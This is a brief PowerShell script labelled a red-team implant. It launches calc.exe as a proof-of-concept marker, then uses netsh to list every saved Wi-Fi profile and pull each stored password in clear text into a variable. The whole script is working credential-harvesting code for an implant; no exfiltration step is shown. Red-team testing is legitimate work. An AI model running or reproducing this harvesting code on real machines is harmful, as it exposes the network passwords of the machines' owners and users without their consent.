Write-Host "Hello World from Kushy Red Team Implant"
Start-Process calc.exe

function Get-WifiCredentials {
    netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {
        $_ -match ':(.+)$'
        $profile = $matches[1].Trim()
        netsh wlan show profile name="$profile" key=clear | Select-String 'Key Content' |
            ForEach-Object {
                $_ -match ':(.+)$'
                [PSCustomObject]@{
                    Profile  = $profile
                    Password = if ($matches[1].Trim()) { $matches[1].Trim() } else { 'N/A' }
                }
            }
    }
}

$credentials = Get-WifiCredentials
